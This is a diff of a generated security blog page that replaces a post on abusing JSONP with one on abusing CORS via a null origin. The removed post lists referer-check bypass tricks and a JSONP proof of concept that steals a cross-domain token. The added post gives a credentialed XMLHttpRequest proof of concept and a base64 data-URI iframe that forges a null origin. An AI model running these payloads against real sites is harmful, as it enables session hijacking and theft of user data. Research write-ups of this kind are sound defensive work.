@@ -9,19 +9,19 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>Abusing JSONP to grab user credentials - 1hack0.github.io</title>
-<meta name="description" content="I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:```GET /api/cross/getsign?callback=test HTTP/1.1Host: portal.domain.comReferer: http://www.otherdomain.com">
+<!-- begin _includes/seo.html --><title>Abusing CORS via null origin - 1hack0.github.io</title>
+<meta name="description" content="">
 
 
 
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="1hack0.github.io">
-<meta property="og:title" content="Abusing JSONP to grab user credentials">
-<meta property="og:url" content="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html">
+<meta property="og:title" content="Abusing CORS via null origin">
+<meta property="og:url" content="http://localhost:4000/2018/07/04/abusing-cors-via-null-origin.html">
 
 
-  <meta property="og:description" content="I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:```GET /api/cross/getsign?callback=test HTTP/1.1Host: portal.domain.comReferer: http://www.otherdomain.com">
+  <meta property="og:description" content="">
 
 
 
@@ -36,7 +36,7 @@
 
 
 
-<link rel="canonical" href="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html">
+<link rel="canonical" href="http://localhost:4000/2018/07/04/abusing-cors-via-null-origin.html">
 
 
 
@@ -243,15 +243,15 @@
 
 
   <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
-    <meta itemprop="headline" content="Abusing JSONP to grab user credentials">
-    <meta itemprop="description" content="I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:```GET /api/cross/getsign?callback=test HTTP/1.1Host: portal.domain.comReferer: http://www.otherdomain.com">
+    <meta itemprop="headline" content="Abusing CORS via null origin">
+    <meta itemprop="description" content="">
     <meta itemprop="datePublished" content="July 04, 2018">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">Abusing JSONP to grab user credentials
+          <h1 id="page-title" class="page__title" itemprop="headline">Abusing CORS via null origin
 </h1>
           
         </header>
@@ -259,47 +259,35 @@
 
       <section class="page__content" itemprop="text">
         
-        <p>I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/cross/getsign?callback=test HTTP/1.1
-Host: portal.domain.com
-Referer: http://www.otherdomain.com
-
-HTTP/1.1 200 OK
-test(crossToken)
-</code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/cross/getsign HTTP/1.1
-Host: www.otherdomain.com
-
-crossToken=[crossToken]
-
-HTTP/1.1 200 OK
-set-cookie: session=xxxxxxxxxxxxxxxxxxxxxxx
-</code></pre></div></div>
-<p>The company prevents the JSONP injection via referer check.</p>
-
-<p>some common referer check  byapss tricks:</p>
-<ul>
-  <li>notdomian.com</li>
-  <li>domain.com.evil.com</li>
-  <li>evil.com/domain.com</li>
-  <li>send a blank referer</li>
-</ul>
-
-<p>Fortunately, I can bypass it using nototherdomain.com. Then  I buy it and host the malicious code there. So, I can steal the victims’ crossToken and hijack their session.</p>
+        <p><img src="http://okqza840l.bkt.clouddn.com/20180704165454.png" alt="" />
+<img src="http://okqza840l.bkt.clouddn.com/20180704165532.png" alt="" /></p>
 
 <p>POC:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script type="text/javascript"&gt;
-function test(data) {
-    var crossToken = data;
-    document.write('crossToken=' + encodeURIComponent(crossToken));
-}
-&lt;/script&gt;
-&lt;script src="http://portal.domain.com/api/cross/getsign?callback=test"&gt;&lt;/script&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+    var url = "https://www.victim.com/api/getuser";
+    var req = new XMLHttpRequest();
+    req.open('get',url,true);
+    req.setRequestHeader("Accept", "application/json");
+    req.withCredentials = true;
+    req.send();
+    req.onreadystatechange= function(){
+    if(req.readyState == req.DONE) {
+        document.write(this.responseText)
+    }}
+ &lt;/script&gt;
 </code></pre></div></div>
-
-<p>Further reading:
-<a href="https://securitycafe.ro/2017/01/18/practical-jsonp-injection/">Practical JSONP Injection</a></p>
-
+<p>This code was converted to the equivalent Base64 string.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe width=100% height=100% src="data:text/html;base64,PHNjcmlwdD4gdmFyIHVybCA9ICJodHRwczovL3d3dy52aWN0aW0uY29tL2FwaS9nZXR1c2VyIjsgIHZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtyZXEub3BlbignZ2V0Jyx1cmwsdHJ1ZSk7cmVxLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsICJhcHBsaWNhdGlvbi9qc29uIik7cmVxLndpdGhDcmVkZW50aWFscyA9IHRydWU7cmVxLnNlbmQoKTtyZXEub25yZWFkeXN0YXRlY2hhbmdlPSBmdW5jdGlvbigpe2lmKHJlcS5yZWFkeVN0YXRlID09IHJlcS5ET05FKSB7ZG9jdW1lbnQud3JpdGUodGhpcy5yZXNwb25zZVRleHQpfSB9PC9zY3JpcHQ+"&gt;
+</code></pre></div></div>
+<p>Further reading:</p>
+<ul>
+  <li><a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">Exploiting CORS misconfigurations for Bitcoins and bounties</a></li>
+  <li><a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/">Exploiting Misconfigured CORS (Cross Origin Resource Sharing)</a></li>
+  <li><a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains">Exploiting Misconfigured CORS via Wildcard Subdomains</a></li>
+  <li><a href="https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html">CORS misconfigurations on a large scale</a></li>
+  <li><a href="https://yassineaboukir.com/blog/cors-exploitation-data-exfiltration-when-allowed-origin-is-set-to-null/">CORS Exploitation: Data exfiltration when allowed origin is set to NULL</a></li>
+  <li><a href="https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/">CORS Misconfigurations Explained</a></li>
+</ul>
 
         
       </section>
@@ -317,24 +305,24 @@ function test(data) {
       <section class="page__share">
   
 
-  <a href="https://twitter.com/intent/tweet?text=Abusing+JSONP+to+grab+user+credentials%20http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-jsonp-to-grab-user-credentials.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=Abusing+CORS+via+null+origin%20http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-cors-via-null-origin.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-jsonp-to-grab-user-credentials.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-cors-via-null-origin.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://plus.google.com/share?url=http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-jsonp-to-grab-user-credentials.html" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+  <a href="https://plus.google.com/share?url=http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-cors-via-null-origin.html" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-jsonp-to-grab-user-credentials.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2018%2F07%2F04%2Fabusing-cors-via-null-origin.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
       
   <nav class="pagination">
     
-      <a href="/2018/07/04/abusing-cors-via-null-origin.html" class="pagination--pager" title="Abusing CORS via null origin
-">Previous</a>
+      <a href="#" class="pagination--pager disabled">Previous</a>
     
     
-      <a href="#" class="pagination--pager disabled">Next</a>
+      <a href="/2018/07/04/abusing-jsonp-to-grab-user-credentials.html" class="pagination--pager" title="Abusing JSONP to grab user credentials
+">Next</a>
     
   </nav>
 
